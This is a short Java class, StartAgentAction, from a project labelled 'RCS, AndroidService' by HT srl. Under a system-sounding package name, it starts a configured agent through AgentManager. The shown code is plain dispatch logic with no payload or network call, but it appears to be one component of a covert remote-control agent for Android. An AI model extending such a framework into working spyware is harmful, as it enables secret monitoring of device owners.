/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : StartAgentAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action;

import com.android.service.agent.AgentManager;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

/**
 * The Class StartAgentAction.
 */
public class StartAgentAction extends AgentAction {
	private static final String TAG = "StartAgentAction"; //$NON-NLS-1$

	/**
	 * Instantiates a new start agent action.
	 * 
	 * @param type
	 *            the type
	 * @param confParams
	 *            the conf params
	 */
	public StartAgentAction(final int type, final byte[] confParams) {
		super(type, confParams);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (execute): " + agentId) ;//$NON-NLS-1$
		}
		final AgentManager agentManager = AgentManager.self();

		agentManager.start(agentId);
		return true;
	}

}
